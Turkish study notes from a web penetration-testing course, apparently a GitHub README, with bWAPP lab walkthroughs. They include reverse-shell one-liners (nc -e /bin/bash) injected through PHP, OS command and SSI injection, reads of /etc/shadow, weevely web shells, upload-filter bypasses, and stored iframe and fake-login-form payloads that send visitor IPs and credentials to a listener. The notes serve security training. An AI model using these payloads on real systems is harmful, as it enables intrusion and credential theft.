# Ethical Hacker Web Penetration Tests and Bug Bounty
- [IP Çeşitleri](#IP-Çeşitleri)
- [HTML Yazabileceğimiz Yerler](#HTML-Yazabileceğimiz-yerler)
- [HTML](#HTML)
  - [Tag](#Tag)
  - [Head](#Head)
  - [Body](#Body)
  - [Başlık](#Başlık)
  - [Boşluk](#Boşluk)
  - [Paragraf](#Paragraf)
  - [Anchor Tags](#Anchor-Tags)
  - [Form](#Form)
  - [Login Ekranı](#Login-Ekranı)
  - [Yorum Paneli](#Yorum-Paneli)
  - [Resim Yerleştirme](#Resim-yerleştirme)
  - [Buton Yerleştirme](#Buton-Yerleştirme)
  - [Footer ve Header](#Footer-ve-Header)
- [Burpsuite](#Burpsuite)
  - [BurpSuite Güncelleme](#BurpSuite-Güncelleme)
  - [Burpsuite İçine Sertifika Yükleme](#Burpsuite-İçine-Sertifika-Yükleme)
- [bWAPP](#bWAPP)
  - [bWAPP Kurulumu](#bWAPP-Kurulumu)
  - [HTML Injection Reflected low level](#HTML-Injection-Reflected-low-level)
  - [HTML Injection Stored low level](#HTML-Injection-Stored-low-level)
  - [Formlardan Kullanıcı Adı ve Şifre Hackleme](#Formlardan-Kullanıcı-Adı-ve-Şifre-Hackleme)
  - [Dirbuster](#Dirbuster)
  - [iFrame Injection](#iFrame-Injection)
- [PHP Açıkları](#PHP-Açıkları)
  - [PHP Code Injection](#PHP-Code-Injection)	 
  - [PHP Upload Injection low level](#PHP-Upload-Injection-low-level)
  - [PHP Upload Injection medium level](#PHP-Upload-Injection-medium-level)
- [Foxy Proxy](#Foxy-Proxy)
- [Kod Çalıştırma SSI](#Kod-Çalıştırma-SSI)
  - [Os Command Injection low level](#Os-Command-Injection-low-level)
  - [Os Command Injection medium level](#Os-Command-Injection-medium-level)
  - [Commix](#Commix)
  - [SSI Injection low level](#SSI-Injection-low-level)
  - [SSI Injection medium level](#SSI-Injection-medium-level)
- [Directory Traversal](#Directory-Traversal)
  - [Directory Traversal low level](#Directory-Travesal-low-level)
  - [DotDotPwn](#dotdotpwn)	  
- [XSS Açıkları](#XSS-Açıkları)
  - [XSS Reflected Get](#XSS-Reflected-Get)
  - [XSS Reflected medium](#XSS-Reflected-medium)
  - [XSS Reflected Ajax Json](#XSS-Reflected-Ajax-Json)
  - [XSS Stored](#XSS-Stored)
- [Broken Access Control](#Broken-Access-Control)
  - [Broken Auth Insecure Login Form](#Broken-Auth-Insecure-Login-Form)
  - [Broken Auth Logout Management](#Broken-Auth-Logout-Management)
  - [Broken Auth Administrative Portals low level](#Broken-Auth-Administrative-Portals-low-level)
  - [Broken Auth Administrative Portals Cookie](#Broken-Auth-Administrative-Portals-Cookie)
- [IDOR Insecure Direct Object References](#IDOR-Insecure-Direct-Object-References)
  - [Insecure DOR Change Secret](#Insecure-DOR-Change-Secret)
  - [Insecure DOR Reset Secret](#Insecure-DOR-Reset-Secret)
  - [Insecure DOR Order Ticket](#Insecure-DOR-Reset-Secret)
- [Portswigger](#Portswigger)
  - [Başkasının Chat Geçmişini Okuma](#Başkasının-Chat-Geçmişini-Okuma)
- [Metasploitable 2 DataBase Değiştirme](#Metasploitable-2-DataBase-Değiştirme)
- [Mutillidae Cookie](#Mutillidae-Cookie)
- [CSRF Cross Site Requset Forgery](#CSRF-Cross-Site-Requset-Forgery)
  - [CSRF Mutillidae](#CSRF-Mutillidae)
  - [CSRF DVWA](#CSRF-DVWA)
  - [CSRF Link ile Hackleme](#CSRF-Link-ile-Hackleme)
- [Brute Force](#Brute-Force) 
  - [Şifre Bulma](#Şifre-Bulma)
  - [Kullanıcı Adı ve Şifre Bulma](#Kullanıcı-Adı-ve-Şifre-Bulma)
- [SQL](#SQL)	
- [SQL Komutları](#SQL-Komutları)
  - [Tablo Listeleme](#Tablo-Listeleme)
  - [Tablo Oluşturma](#Tablo-Oluşturma)
  - [Tabloya Veri Ekleme](#Tabloya-Veri-Ekleme)
  - [Tablo Filtreleme](#Tablo-Filtreleme)
  - [Tablo Güncelleme](#Tablo-Güncelleme)
  - [Tablodan Veri Silme](#Tablodan-Veri-Silme)
  - [2 Tabloyu Birlikte Listeleme](#2-Tabloyu-Birlikte-Listeleme)
  - [Tablodaki Sütun Sayısını Bulma](#Tablodaki-Sütun-Sayısını-Bulma)
  - [Tablodaki Verileri Çekme](#Tablodaki-Verileri-Çekme) 
- [SQL Injection](#SQL-Injection)
  - [SQL Post Methodu](#SQL-Post-Methodu)
    - [SQL Şifre Girmeden Login Olma](#SQL-Şifre-Girmeden-Login-Olma)
    - [Daha Güvenli Sitelerde SQL Açığı](#Daha-Güvenli-Sitelerde-SQL-Açığı)
  - [SQL Get Methodu](#SQL-Get-Methodu)
    - [SQL Union Select](#SQL-Union-Select)
      - [SQL Union Select Sütun Sayısı Öğrenme](#SQL-Unio-Select-Sütun-Sayısı-Öğrenme)
      - [SQL Union Select Database Öğrenme](#SQL-Union-Select-Database-Öğrenme)
      - [SQL Union Select Tablo İsimlerini Öğrenme](#SQL-Union-Select-Tablo-İsimlerini-Öğrenme)
      - [SQL Union Select Sütun İsimlerini Öğrenme](#SQL-Union-Select-Sütun-İsimlerini-Öğrenme)
      - [SQL Union Select Sütun İçindeki Bilgileri Öğrenme](#SQL-Union-Select-Sütun-İçindeki-Bilgileri-Öğrenme) 
- [Blind SQL Injection](#Blind-SQL-Injection)
- [DVWA SQL Injection](#DVWA-SQL-Injection)
  - [SQL Injection HEX Vermek](#SQL-Injection-HEX-Vermek)
- [Database'in Bulunduğu Sunucudaki Dosyaları Okuma ve Yazma](#Database'in-Bulunduğu-Sunucudaki-Dosyaları-Okuma-ve-Yazma)
  - [Veri Okuma](#Veri-Okuma)
  - [Veri Yazma](#Veri-Yazma)
  - [PHP Dosyasını Veri Olarak Eklemek](#PHP-Dosyasını-Veri-Olarak-Eklemek)
-[SQL Map](#SQL-Map)
- [Heroku](#Heroku)
- [Juice Shop](#Juice-Shop)
  - [Level 1](#Level-1)
    - [ScoreBoard Bulma](#ScoreBoard-Bulma)
    - [Nikto](#Nikto)
    - [DOM XSS](#DOM-XSS)
    - [Kullanıcı Oluşturma](#Kullanıcı-Oluşturma)
    - [Redirect Outdated Whitelist](#Redirect-Outdated-Whitelist)
    - [Sıfır Yıldızlı Geri Bildirim](#Sıfır-Yıldızlı-Geri-Bildirim)
      - [Burpsuite](#Burpsuite)
      - [HTML](#HTML)
  - [Level 2](#Level-2)
    - [Başkasının Sepetini Görüntüleme](#Başkasının-Sepetini-Görüntüleme)
    - [SQL Injection](#SQL-Injection)
    - [Admin Olarak Giriş](#Admin-Olarak-Giriş)
    - [Kullanıcı Şifresi Öğrenme](#Kullanıcı-Şifresi-Öğrenme)
      - [Cookie Bilgilerini Kırma](#Cookie-Bilgileri-Kırma)
      - [Brute Force](#Brute-Force)
    - [Admin Panelini Bulmak](#Admin-Panelini-Bulmak)
    - [XEE Açıkları](#XEE-Açıkları)
  - [Level 3](#Level-3)
    - [Admin Yetkileriyle Kullanıcı Oluşturma](#Admin-Yetkileriyle-Kullanıcı-Oluşturma)
    - [Captcha ByPass](#Captcha-ByPass)
    - [Başkasının Sepetine Ürün Eklemek](#Başkasının-Sepetine-Ürün-Eklemek)
    - [Başka Kullanıcı Adına Feedback Vermek](#Başka-Kullanıcı-Adına-Feedback-Vermek)
      - [Burpsuite](#Burpsuite)
      - [HTML Kaynak Kodu](#HTML-Kaynak-Kodu)
    - [Başka Kullanıcı Adına Yorum Yapmak](#Başka-Kullanıcı-Adına-Yorum-Yapmak)
    - [Eksi Sipariş Vermek](#Eksi-Sipariş-Vermek)
- [OWASP Top 10 2021](#OWASP-Top-10-2021)
- [SSRF](#SSRF)
  - [SSRF Admin Paneline Ulaşma](#SSRF-Admin-Paneline-Ulaşma)
  - [SSRF Backend Saldırısı](#SSRF-Backend-Saldırısı)
  - [SSRF Blacklist](#SSRF-Blacklist)
  - [SSRF Whitelist](#SSRF-Whitelist)
- [API Güvenliği](#API-Güvenliği)
- [Digital Ocean Sunucu Oluşturma](#Digital-Ocean-Sunucu-Oluşturma)
  - [Sunucuya API Kurulumu](#Sunucuya-API-Kurulumu)
- [Postman](#Postman)
- [vAPI CTF](#vAPI-CTF)
  - [API1 Broken Object Authorization](#API1-Broken-Object-Authorization)
  - [API2 Broken Authentication](#API2-Broken-Authentication)
  - [API4 İki Faktörlü Doğrulama](#API4-İki-Faktörlü-Doğrulama)
  - [API5 Broken Function Level Authorization](#API5-Broken-Function-Level-Authorization)
  - [API6 Mass Assignment](#API6 Mass Assignment)
  - [API7 Cors](#API7-Cors)
  - [API8 SQLi Injection](#API8-SQLi-Injection)
  - [API9 Versiyon Farklılığı](#API8-Versiyon-Farklılığı)
- [Bilgi Toplama](#Bilgi-Toplama)
  - [Whoislookup](#Whoislookup)
    - [Icanlookup](#Icanlookup)
    - [Who is.domaintools](#Who-is.domaintools)
  - [DNS Look Up](#DNS-Look-Up)
    - [Robtex.com](#Robtex.com)
  - [Sitereport Netcraft.com](#Sitereport-Netcraft.com)
# IP Çeşitleri
> ## Public IP 
- Kamuya açık IP
> ## Local IP
- Modem tarafından bize verilen IP. Modemimizi her resetlediğimizde değişir
---
# HTML Yazabileceğimiz Yerler
> ## 1.Nano
- ```nano html101.html``` yazarak yeni bir html dosyası açabilir içine yazabiliriz
> ## 2. Geany 
- Geany'i sadece ```HTML``` değil başka dilleri yazarkende kullanabiliriz
```
apt-get install geany
geany
```
> ## 3. Gedit
```
apt-get install gedit
gedit html101.html
```
---
# HTML
![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.19.59.jpeg)

> ## Tag
- ```<DOCTYPE html>``` belgenin tipini belirtir. Biz HTML kullanıyoruz demektir
> ## Head
- ```<HEAD>``` içine "meta data" dediğimiz genel özellikler yazılır
```
<head>
  <title>Kali Linux Website</title>
</head>
```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.33.24.jpeg)
> ## Body
- ```<BODY>``` içine kullanıcının gördüğü elemanları yazarız

- ```<!--NOT-->``` kullanarak kod içine notlar bırakabiliriz
> ## Başlık 
- ```<h1>Hello World</h1>``` Başlık olarak büyük ve kalın fontta yazar

- ```<h2>Hello World</h2>``` Biraz daha küçük boyutta ve kalınlıkta yazar

- 

- 

- 

- ```<h6>Hello World</h6>``` Olabilecek en küçük boyut ve kalınlıkta yazar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.49.48.jpeg)

> ## Boşluk
- ```<br>``` Bir satır boşluk bırakır
> ## Paragraf
- ```<p></p>``` içine yazılan şeyler metin görünümünde olur

- ```<p><stong>test</strong></p>``` metini kalın yazar

- ```<p><em>test</em></p>``` metini italik yazar
> ## Anchor Tags
- Link eklemek için kullanılır

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.08.32.jpeg)

- Google'a ```html acher tag attributes``` yazarak yapılabilecek değişiklikleri görebiliriz
  
- ```<a href="https://google.com">my link</a>``` sayfa yönledirmek için kullanılır (google'a yönlendirir)

- ```<a target=' blank' href="https://google.com">my link</a>``` linkteki sayfayı yeni sekmede açar (google'ı açar)
> ## Form
- Kullanıcıdan girdi alınırken kullanılır
- ```<form></form>``` içine yazılır
- ```<div></div>``` form içini gruplamak için kullanılır
- ```<label>Yorum</label>``` içine ufak textler bulundurur
- ```<input>``` kullanıcıdan girdi alınırken kullanılır
> ## Login Ekranı
```
<form> 
<div>
    <label>Kullanıcı Adı</label>
    <input type="text" name="username" placeholder="username">
</div>
<div>
    <label>Şifre</label>
    <input type="password" name="password" placeholder="password">
</form>
```
- ```placeholder``` o kısım boşken içinde yazacağı şey
- ```type``` tipinin en olacağı ```password``` yazarsak yazdığımız şey gizlenmiş olarak gösterilir ```text``` yazarsak normal gösterilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/20286080ce72c1be333fbda0a9a832d548d58380/Pictures/WhatsApp%20Image%202022-09-12%20at%2020.38.24%20(3).jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.34.25.jpeg)

> ## Form
```
<form>
<div>
    <label>Yorum</label>
    <textarea name="text area"></textarea>
</div>
</form>
```

> ## Resim Yerleştirme
- ```<img width="600px" height=""400px" src="<resim URL'si>">```
> ## Buton Yerleştirme
- ```<button>click me </button>``` click me yazılı bir buton eklenir
> ## Footer ve Header
- ```<footer>Copyright ahmetnuysal 2022</footer>``` Sayfanın alt kısımına bilgi eklememizi sağlar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.57.35.jpeg)

- ```<header>...</header>``` Sayfanın en üstüne bilgi eklememizi sağlar
# Burpsuite 

### Burpsuite'nin ücretsiz versiyonunda projelerimizi kaydedemiyoruz

> ## BurpSuite Güncelleme
- Burpsuite güncellemesi yaparken ```.sh``` dosyasını indirdikten sonra terminal üzerinden bulunduğu konuma giderek ```bash dosyaadı.sh``` çalıştırıp güncelliyoruz
- ```proxy -> options``` kısımına girip ```127.0.0.1:8080``` yazıp yazmadığını kontrol ediyoruz yoksa add diyerek ekliyoruz
- Belirlediğimiz ```proxy``` adresini firefox'a da bildirmemiz gerekiyor, bunun için;
```
firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyoruz
-> HTTP  proxy 127.0.0.1 ve port 8080 yazıyoruz -> Also use this proxy HTTPS'i seçiyoruz
```
- Bu ayarlamayı sadece ```Burpsuite``` kullanırken yapmamız gerekiyor
- ```Intercept```içine girip ```Intercept is off``` olduğunu kontrol ediyoruz
> ## Burpsuite İçine Sertifika Yükleme

- Burpsuite içine sertifika yüklemek için ```install burpsuite certificate firefox```'u google'llıyoruz
- ```Portswigger``` sitesine giriyoruz
- ```http://burp```'e girip ```CA certificate```'e tıklayıp indiriyoruz
- ```firefox setting -> certificate aratıyoruz -> view certificate -> import``` diyip indirdiğimiz dosyayı seçiyoruz

# bWAPP

> ## bWAPP Kurulumu
- Bee-box sanal makinesini ayarlamalarını yapıp kuruyoruz. 
- Bee-box'ı kurduktan sonra açıyoruz, masaüstüne bulunan start'a basıyoruz.
- Terminali açıp ```setxkbmap tr``` ve ```ifconfig``` çalıştırıyoruz
- Kalimizi açıyoruz ve ```bee-box IP``` adresimizin websitesine giriş yapıyoruz

| kullanıcı adı | bee |
| --- | --- |
| şifre | bug |

- Hangi açık üzerinden gitmek istiyorsak onu ve zorluk level'ini seçebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/1.jpeg)

> ## HTML Injection Reflected low level

! Bu yöntemi burpsuite kullanmadan da yapabiliriz.

! ```Get```-> Gönderirken

! ```Post``` -> Alırken kullanılır

- Burpsuite açıyoruz ve ```Intercept -> ıntercept is on``` yapıyoruz. Artık sitede işlem yapmadan önce yakalayıp bize yollayacak
- ```Forward```'a basarak işlemi yolluyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/2.jpeg)

- Site'nin name kısmına ```<h1>ahmet</h1>``` yazıyoruz ve deniyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/3.jpeg)

- ```HTML injection cheat sheet github```'ı google'llıyoruz ve yazabileceğimiz diğer HTML kodlarını görüyoruz
- Name kısmına ```<h1>Hello<script>alert(1)</script>!</h1>```

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/4.jpeg)

! Eğer çalışıyorsa sitede HTML injection vardır ve JS kodu çalıştırılabiliyordur

> ## HTML Injection Stored low level 

! ```Stored``` o siteye giren herkesi etkiliyor demektir. (Örneğin blog siteleri)

- Yazı yazdığımız kısıma ```<h1>ahmet</h1>``` deniyoruz, eğer çalışıyorsa açık var demektir
- ```<iframe src="{resim linki}"></iframe>``` ile blog sitesine resim eklemeyi deniyoruz

! Google'a ```iframe html``` aratarak gerekli diğer kodlara erişebiliriz

- ```nc -nvlp 4545``` ile NATCAT açıyoruz
- ```<iframe src="http://192.168.123.123:4545/test" height="0" width="0"></iframe>``` Normalde IP adresimiz bizim Publıc IP'miz olmalıdır, Port numarası çalışmazsa değiştirilebilir, ```height ve width```'i blog'a eklenen şey görülmesin diye 0 yapıyoruz
- Artık o siteye giren cihazların IP adreslerini görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/5.jpeg)

> ## Formlardan Kullanıcı Adı ve Şifre Hackleme

- ```nc -nvlp 4545``` ile NATCAT çalıştırıyoruz
- ```geany``` açıyoruz
```
<form name="login" action="http://192.168.123.123:4545/test.html">
  <table>
	  <tr><td>Username:</td><td><input type="text" name="username" placeholder="username"></td></tr>
		<tr><td>Password:</td><td><input type="password" name="password" placeholder="password"></td></tr>
	</table>
	<input type="submit" value="Login">
</form>
```
- Yazdığımız HTML kodunu blog'a yapıştırıyoruz. Kodu yazdığımız sitenin kendi login ekranının hazır HTML kodlarınıda yapıştırabiliriz
- Kullanıcılar o kısıma login yaptıklarında giriş bilgilerini ```NATCAT``` üzerinden görebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/6.jpeg)

> ## Dirbuster

- Sitedeki gizli subdomainleri bulmamızı sağlar
- Kali'mizde ```dirbuster```'ı açıyoruz
- ```Target URL```'yi giriyoruz
- ```Autoswitch```'i yazıyoruz
- ```Number of threads```'i seçiyoruz. Eğer hedef sitede ```firewall``` varsa ```Number of threads```'i 10 yapıyoruz, yoksa 200 yapabiliriz
- ```file with list of dir``` seçiyoruz. İçinde bir sürü popüler dosya ismi bulundural .txt dosyasını seçiyoruz
- ```Kali -> usr -> share -> wordlist -> dirbuster -> directory-list-2-.3-medium.txt``` 
- Worldlist içinde farklı konularda .txt dosyaları bulunur, saldırı türüne göre dosya seçilir. fasttrack.txt -> şifreler namelist.txt -> usernameler
- ```Start``` diyoruz
- ```Result``` kısmına tıklarsak sonuçları (subdomainleri) görebiliriz
! HTTP 80 portunu kullanır
- ```Responsu 200``` olanlar gerçekten bulunur, diğerleri hata verebilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/8.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/9.jpeg)

> ## iFrame Injection

- Siteye sağ tıklayıp ```view page source``` açıyoruz
- ```CTRL+F``` yapıp ```iframe``` arıyoruz
- ```<iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>``` kodunda bulunan ```robots.txt```'i değiştirirsek ekranda o subdomain'i görürüz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/10.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/11.jpeg)

- ```burpsuite```i açıp ```intercept is on``` yapıyoruz ve ```forward```'a basıyoruz 
- ```Get/bWAPP/iframe...``` kısmını değiştirebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/12.jpeg)

- Bu kısımdaki iframe kodunu kapatıp  sonuna ```</iframe><h1>hellohtml</h1>``` ekliyoruz (...ParamHeight=250"></iframe></h1>) ve ```forward```diyoruz

# PHP Açıkları

> ## PHP Code Injection

- Dosya upload ederek yararlanılan zaafiyetlerdir
- PHP açıklarında ```burpsuite``` kullanılabilir, eğer parametre linkte varsa ```burpsuite``` kullanmaya gerek yok

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.01.34.jpeg)

- Parametreler linkte yoksa ```burpsuite``` içinde ```intercept is on``` yapıyoruz ve yakaladığmız ```GET``` dosyası içinde değişiklik yapıyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.02.36.jpeg)

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.03.08.jpeg)

- ```...?message=hello;system("whoami")``` deniyoruz. ";" işareti aynı anda 2 komut çalıştırmamızı sağlar

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.09.37.jpeg)

- ```...?message=hello;system("cat /etc/passwd")``` ve ```...?message=hello;system("cat /etc/shadow")``` deniyoruz, bu kod ile sistem şifrelerini görebiliriz

! cat /etc/passwd ve cat /etc/shadow içerisinde kriptolanmış kali şifrelerini görebiliriz.

- ```Natcat``` kullanarak dinleme yapabileceğimiz gibi portlara bilgide yollayabiliriz
- ```nc -nvlp 1234``` ile dinlemeyi başlatıyoruz
- ```...?message=test;system("nc 192.168.123.123 1234 -e /bin/bash")``` çalıştırıyoruz işe yaramazsa ```-e /bin/sh``` deneyebiliriz
- Terminal'i kullanarak site içerisinde gezinebiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.18.38.jpeg)

- Sunucuda bir python kodu çalıştırabiliyorsak kendimiz bir shell açabiliriz
- Terminal üzerinden site sunucusundayken ```python -c import pty; pty.spawn("/bin/bash")``` yazıyoruz ve shell açmayı deniyoruz

> ## PHP Upload Injection low level

- Görsel yükleyebildiğimiz sitelerde yararlanılan bir zaafiyettir
- Site içerisine ```.php``` dosyası yüklemeyi deneriz
- ```.php``` dosyası hazırlarken ```weevely``` kullanırız

```
weevely generate <password><dosya ismi> -> .php dosyası oluşturur
weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanarak shell içine girmemizi sağlar
```
- Eğer site içerisinde dosyanın yüklendiği konum görünmüyorsa ```burpsuite``` açıp ```response``` kısmından bulabiliriz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.47.45.jpeg)

- Artık sunucu içine giriş yaptık, sunucu içinde komutlarla (ls,pwd vb) dolaşabiliriz

> ## PHP Upload Injection medium level

- Bazı siteler bazı uzantıları engellemiş olabilir

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.52.17.jpeg)

- O zaman ```.php``` dosyamızın bulunduğu konuma gideriz ```cp myphp.php myphp.php3``` kodu ile dosyayı farklı isimle kopyalarız, Çalışmazsa ```.php4 veya .php5``` deneyebiliriz

# Foxy Proxy

- ```Foxy Proxy``` firefox içinde elimiz ile yaptığımız proxy ayarını tek tıkla yapmamızı sağlar
- Google'a ```Foxy Proxy``` yazıp firefox'umuza ekliyoruz
- İçine girip ```options -> add -> gerekli yerleri dolduruyoruz``` 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.32.02.jpeg)

# Kod Çalıştırma SSI

> ## Os Command Injection low level

- Sunucuda komut çalıştımamızı sağlayan zafiyettir
- ```Burpsuite``` içinde ```ıntercept is on``` yapıyoruz, web sitesinden look up diyoruz

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)

- Siteye yolladığımız url sonunda ```;whoami``` ekleyip deniyoruz, eğer çalışırsa açık var demektir
- ```nc -nvlp 1234``` çalıştırıyoruz
- Siteye yolladığımız url sonuna ```;nc 192.168.123.123 1234 -e /bin/bash``` ekliyoruz 
- Terminalimizi açıp açılan shell üzerinden server içinde dolaşabiliriz

> ## Os Command Injection medium level

- Bazı siteler ";" ile yazdığımız komutları filterlerip ";"'lleri silebilir çalışmaya biliri 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)

- Aynı anda iki komut çalıştırmamızın başka yollarıda vardır;
  - ```www.nsa.gov|pwd``` deneyebiliriz ya da ```www.nsa.goc&&pwd``` deneyebiliriz 
  - ```"|" ve "&&" aynı ";" gibi işimize yarar```
- ```nc -nvlp 1234``` çalıştırıp
- ```www.nsa.gov | nc 192.168.123.123 1234 -e /bin/bash``` diyerek giriş yapabiliriz ve terminal üzerinden server'da dolaşabiliriz

> ## Commix

- Komut enjeksiyonunda bulunan açıkları bulur ve bu açıkları exploit eder

! ```cookie``` daha önceden girdiğimiz sitelerdeki bilgilerimiz cookie olarak kaydedilir ve daha sonra tekrar girdiğimizde sitenin bizi tanımasını sağlar (siteye çok giren kişiye ekstra indirim yapılması gibi)

- ```commit -h``` help kısmının açar
- ```cookie``` kullanan sitelerde ```PHPSESSID``` ve ```target``` bilgilerini kullanırız
- ```commix --url="<site url'si>" --cookie="<cookie kısmında yazan bilgiler (security level ve PHPSESSID) --data="<target kısımında yazan bilgiler>"``` 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.27.44.jpeg)

- ```data ve cookie``` bilgileri ```Burpsuite``` içinde POST'lardan birine tıklayarak elde edebiliriz
- ```commix``` ile açığı arayıp bulduğu zaman shell oluşturur

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.38.19.jpeg)

> ## SSI Injection low level

- ```SSI (server-side ıncludes)```: Sunucuda çalıştırılan bir programlama dilidir. ".shtml, .stm, .shtm" varsa SSI kullanılıyor demektir
- Gerekli SSI kodlarına ve nasıl uygulanacağı google'dan ulaşabiliriz;

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.44.08.jpeg)

  - ```include```: Dosya yüklemek için kullanılır
  - ```exec```: Komut çalıştırmak için kullanılır
  - ```echo```: Yazdırma işlemi için kullanılır

- Siteyle etkileşime girebilceğimiz yere ```<!--#exec cmd="ls"-->``` yazıyoruz ve deniyoruz
- Açık varsa terminali açıyoruz ```nc -nvlp 1234``` çalıştırıyoruz
- Siteye gidip ```<!--#exec="192.168.123.123 1234 -e /bin/bash"``` yazıyoruz 
- Terminale girip açık shell'den site içerisinde dolaşıyoruz

> ## SSI Injection medium level

- Bazı sitelerde ```(<!--#exec...)``` çalışmazsa koddaki bir şey filterlenmiş olabilir
- Kodda bulunan parçalardan 2 tane koyarak tek tek deniyoruz ```(<<!--#exec...)``` 
- Bu sitede tırnak işaretlerini kaldırıyoruz ve deniyoruz 

![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2016.48.23.jpeg)

- Bunu kolay yoldan yapmak için ```commix``` kullanılabilir, ancak bazı durumlarda manuel olarak tek tek denememiz gerekir

# Directory Traversal

- Erişim sağlayamayacağımız yerlere erişim sağlama hatasıdır

> ## Directory Traversal low level

- Url üzerinde .php kullanıldığını görüyoruz
